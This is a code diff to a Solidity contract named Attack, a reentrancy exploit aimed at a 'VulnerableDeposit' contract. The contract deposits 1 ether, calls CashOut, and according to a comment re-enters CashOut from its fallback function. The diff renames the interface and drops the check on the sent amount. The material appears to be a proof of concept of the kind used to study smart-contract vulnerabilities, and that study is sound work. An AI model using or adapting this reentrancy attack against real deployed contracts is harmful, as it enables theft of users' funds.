@@ -1,16 +1,16 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface VulnerableDeposit {
+interface IVulnerableDeposit {
     function Deposit() external payable;
     function CashOut(uint256 _am) external payable;
 }
 
 contract Attack {
-    VulnerableDeposit public target;
+    IVulnerableDeposit public target;
 
     constructor(address _vulnerableDepositAddress) {
-        target = VulnerableDeposit(_vulnerableDepositAddress);
+        target = IVulnerableDeposit(_vulnerableDepositAddress);
     }
 
     // Fallback function to receive Ether and re-enter CashOut
@@ -21,8 +21,7 @@ contract Attack {
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
-        target.Deposit{value: 1 ether}();
+        target.Deposit{value: 1.0 ether}();
         target.CashOut(1 ether);
     }
 }
